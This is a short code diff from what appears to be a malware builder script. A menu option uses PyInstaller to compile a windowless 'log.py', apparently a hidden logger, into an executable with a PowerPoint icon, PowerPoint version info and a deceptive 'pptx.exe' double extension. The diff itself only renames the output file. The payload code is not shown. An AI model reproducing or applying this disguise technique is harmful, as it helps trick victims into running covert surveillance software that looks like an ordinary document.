@@ -82,7 +82,7 @@ elif choice == '3':
     sys.exit()
 
 elif choice == '4':
-    name = 'abs_powerpoint.pptx.exe'
+    name = 'log_powerpoint.pptx.exe'
     os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/powerpoint.ver -i Icons/powerpoint.ico -F log.py')
     os.system('rmdir /S /Q build __pycache__')
